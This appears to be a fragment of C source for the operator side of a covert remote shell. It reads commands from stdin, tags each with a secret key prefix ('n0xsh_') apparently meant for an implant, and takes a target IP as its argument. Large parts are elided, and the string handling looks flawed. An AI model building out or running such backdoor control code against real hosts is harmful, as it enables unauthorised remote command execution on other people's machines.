...
void *cmd_exec(){
    ...
    while (1){
        int readx;
        //printf("cmd $ ");
        unsigned char shell_key_with_command[2049] = "n0xsh_";
        unsigned char command[2048];

        readx = read(0, command, 2048);
        strncat(shell_key_with_command, command, strlen(command));
        strncat(shell_key_with_command, " #", 3);
        //printf(command);
        if (readx > 0){
...
int main(int argc, char **argv)
{
    ...
    if (argc < 2){
        printf("You need to suply the target ip, ./server <target-ip>\n");
        return -1;
    }
